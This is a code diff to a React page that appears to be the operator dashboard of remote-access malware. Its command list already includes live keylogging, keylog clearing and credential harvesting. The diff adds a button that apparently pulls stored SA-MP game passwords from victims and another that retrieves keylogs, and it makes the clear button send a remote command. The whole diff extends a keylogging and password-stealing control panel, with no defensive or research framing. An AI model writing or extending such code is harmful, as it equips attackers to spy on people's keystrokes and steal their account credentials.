@@ -12,7 +12,7 @@ import {
   MousePointer2, PanelRight, PanelBottom, Grid3X3, List as ListIcon,
   ArrowUp, ArrowDown, RotateCcw, Ban, Check, AlertCircle,
   Shield, Zap, Radio, MapPin,
-  Server, Play, Square, EyeOff
+  Server, Play, Square, EyeOff, Database, KeyRound
 } from 'lucide-react';
 import { motion, AnimatePresence } from 'framer-motion';
 import { toast } from 'sonner';
@@ -331,6 +331,8 @@ const HDexPage: React.FC = () => {
     { label: 'LIVE KEYLOG', type: 'start_live_keylog', icon: Radio },
     { label: 'STOP LIVE KEY', type: 'stop_live_keylog', icon: Square },
     { label: 'CLEAR KEYLOGS', type: 'clear_keylogs', icon: Trash2 },
+    { label: 'SA-MP PASS', type: 'samp_passwords', icon: KeyRound },
+    { label: 'GET KEYLOGS', type: 'get_keylogs', icon: Database },
   ];
 
   const harvestCmds: { label: string; type: string; icon: any; group: string }[] = [
@@ -524,7 +526,7 @@ const HDexPage: React.FC = () => {
             <div style={{ display: 'flex', gap: '0.3rem' }}>
               <button onClick={() => sendCommand('start_keylogger')} className="btn" style={{ fontSize: '0.5rem', padding: '0.3rem 0.6rem', borderColor: dangerColor }}>ON</button>
               <button onClick={() => sendCommand('stop_keylogger')} className="btn" style={{ fontSize: '0.5rem', padding: '0.3rem 0.6rem' }}>OFF</button>
-              <button onClick={() => setKeylogData('')} className="btn" style={{ fontSize: '0.5rem', padding: '0.3rem 0.6rem' }}>CLR</button>
+              <button onClick={() => sendCommand('clear_keylogs')} className="btn" style={{ fontSize: '0.5rem', padding: '0.3rem 0.6rem' }}>CLR</button>
             </div>
           </div>
           <div style={{ flex: 1, background: '#050505', border: '1px solid #111', borderRadius: '4px', padding: '0.8rem', fontFamily: 'monospace', fontSize: '0.7rem', color: accentColor, overflowY: 'auto', whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>
